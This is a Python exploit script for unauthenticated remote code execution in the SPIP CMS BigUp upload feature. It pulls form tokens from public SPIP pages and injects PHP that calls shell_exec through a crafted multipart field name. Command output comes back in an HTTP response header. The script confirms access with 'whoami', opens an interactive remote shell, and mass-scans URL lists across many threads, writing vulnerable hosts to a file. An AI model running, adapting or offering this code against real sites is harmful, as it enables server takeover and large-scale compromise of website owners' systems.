#!/usr/bin/env python3
import sys
import base64
import random
import string
import requests
import concurrent.futures
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
import click

requests.packages.urllib3.disable_warnings()


class SpipBigUp:
    def __init__(self, base_url, verbose=True, proxy=None):
        self.base_url = base_url
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.verbose = verbose
        self.headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}

    def custom_print(self, message: str, header: str) -> None:
        header_mapping = {
            "+": "✅",
            "-": "❌",
            "!": "⚠️",
            "*": "ℹ️ ",
        }
        emoji = header_mapping.get(header, "❓")
        formatted_message = f"{emoji} {message}"
        click.echo(click.style(formatted_message, bold=True, fg="white"))

    def get_form_action_args(self):
        parsed_url = urlparse(self.base_url)
        custom_path = parsed_url.path.lstrip("/")

        pages = []
        if custom_path:
            pages.append(custom_path)
        pages.extend(["login", "spip_pass", "contact"])

        for page in pages:
            url = (
                f"{parsed_url.scheme}://{parsed_url.netloc}/{page}"
                if custom_path and page == custom_path
                else f"{self.base_url}/spip.php?page={page}"
            )
            try:
                response = requests.get(
                    url,
                    headers=self.headers,
                    proxies=self.proxies,
                    verify=False,
                    timeout=5,
                )
                if response.status_code != 200:
                    continue

                soup = BeautifulSoup(response.text, "html.parser")
                form_data = {
                    "action": soup.find("input", {"name": "formulaire_action"}),
                    "args": soup.find("input", {"name": "formulaire_action_args"}),
                }
                form_data = {k: v.get("value") for k, v in form_data.items() if v}
                if len(form_data) == 2:
                    return form_data

            except requests.exceptions.RequestException as e:
                if self.verbose:
                    self.custom_print(
                        f"Failed to fetch form data from `{page}` page: {e}", "-"
                    )
        return None

    def post_article_form(self, form_data, command):
        try:
            boundary = "".join(
                random.choices(string.ascii_letters + string.digits, k=16)
            )
            random_name = "".join(random.choices(string.ascii_letters, k=4))
            random_filename = "".join(random.choices(string.ascii_letters, k=4))

            php_payload = (
                f'header("X-Command-Output: " . base64_encode(shell_exec(base64_decode("{command}"))))'
            ).replace('"', '\\"')

            parts = [
                f'--{boundary}\r\nContent-Disposition: form-data; name="formulaire_action"\r\n\r\n{form_data["action"]}',
                f'--{boundary}\r\nContent-Disposition: form-data; name="bigup_retrouver_fichiers"\r\n\r\n1',
                f'--{boundary}\r\nContent-Disposition: form-data; name="{random_name}[\' . {php_payload} . die() . \']"; filename="{random_filename}"\r\nContent-Type: text/plain\r\n\r\nTest',
                f'--{boundary}\r\nContent-Disposition: form-data; name="formulaire_action_args"\r\n\r\n{form_data["args"]}',
                f"--{boundary}--",
            ]
            body = "\r\n".join(parts)

            headers = self.headers.copy()
            headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

            response = requests.post(
                self.base_url,
                data=body,
                headers=headers,
                proxies=self.proxies,
                verify=False,
                timeout=5,
            )

            return response
        except requests.exceptions.RequestException:
            return None

    def execute_command(self, form_data, command):
        encoded_command = base64.b64encode(command.encode()).decode()
        response = self.post_article_form(form_data, encoded_command)

        if response and response.status_code == 200:
            encoded_output = response.headers.get("X-Command-Output")
            if encoded_output:
                decoded_output = base64.b64decode(encoded_output).decode()
                return decoded_output
        return None

    def check_vulnerability(self):
        form_data = self.get_form_action_args()
        if not form_data:
            return False, None
        output = self.execute_command(form_data, "whoami")
        if output:
            return True, output
        return False, None

    def interactive_shell(self):
        session = PromptSession(history=InMemoryHistory())
        form_data = self.get_form_action_args()

        if not form_data:
            self.custom_print(
                "Failed to retrieve `formulaire_action_args`.", "-"
            )
            return

        self.custom_print("Interactive shell started. Type `exit` to quit.", "*")
        while True:
            cmd = session.prompt(
                HTML("<ansiyellow><b>$ </b></ansiyellow>"), default=""
            ).strip()
            if cmd.lower() == "exit":
                self.custom_print("Exiting shell...", "*")
                break
            if cmd.lower() == "clear":
                sys.stdout.write("\x1b[2J\x1b[H")
                continue
            output = self.execute_command(form_data, cmd)
            if output:
                print(output)
            else:
                self.custom_print("Failed to receive response.", "-")


@click.command(help="SPIP BigUp Unauthenticated RCE Exploit")
@click.option("-u", "--url", help="Target URL")
@click.option("-f", "--file", help="File with list of URLs")
@click.option("-t", "--threads", default=50, help="Number of threads")
@click.option("-o", "--output", help="Output file for vulnerable URLs")
@click.option("--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080)")
def main(url, file, threads, output, proxy):
    if url:
        spip = SpipBigUp(url, proxy=proxy)
        is_vulnerable, output_cmd = spip.check_vulnerability()
        if is_vulnerable:
            spip.custom_print(f"Target is vulnerable! Command Output: {output_cmd}", "+")
            spip.interactive_shell()
        else:
            spip.custom_print("Target not vulnerable or exploit failed.", "-")

    elif file:
        urls = [line.strip() for line in open(file) if line.strip()]

        def process_url(url):
            spip = SpipBigUp(url, proxy=proxy)
            is_vuln, cmd_output = spip.check_vulnerability()
            return spip, url, is_vuln, cmd_output

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(process_url, url): url for url in urls}
            for future in concurrent.futures.as_completed(futures):
                spip, url, is_vuln, cmd_output = future.result()
                if is_vuln:
                    spip.custom_print(f"Vulnerable URL: {url}", "+")
                    if cmd_output:
                        spip.custom_print(f"Command Output: {cmd_output}", "+")
                    if output:
                        with open(output, "a") as f:
                            f.write(f"{url}\n")
    else:
        click.echo("You must specify a URL or a file with URLs.")


if __name__ == "__main__":
    main()
